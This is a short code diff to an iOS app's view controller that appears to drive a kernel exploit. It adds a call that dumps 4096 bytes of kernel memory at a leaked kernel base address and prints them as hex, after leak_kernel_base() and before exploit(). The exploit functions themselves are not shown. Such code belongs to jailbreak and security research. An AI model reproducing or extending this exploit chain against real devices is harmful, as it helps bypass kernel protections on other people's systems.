@@ -13,6 +13,7 @@
 
 void initialize(void);
 uint32_t leak_kernel_base(void);
+void dump_kernel_mem(uint32_t, uint32_t, uint8_t[4096]);
 void exploit(uint32_t);
 
 @interface ViewController ()
@@ -49,9 +50,24 @@ void exploit(uint32_t);
 }
 
 - (IBAction)start:(id)sender {
+    uint8_t kdata[4096];
+    
     initialize();
     uint32_t kernel_base = leak_kernel_base();
     printf("kernel base: %p\n", (void *)kernel_base);
+    
+    dump_kernel_mem(kernel_base, kernel_base, kdata);
+    
+    printf("\nkernel memory:");
+    int i;
+    for (i=0; i<4096; i++) {
+        if (i % 4 == 0) {
+            printf("\n");
+        }
+        printf("%02x ", kdata[i]);
+    }
+    printf("\n");
+    
     exploit(kernel_base);
     
     // Update button.
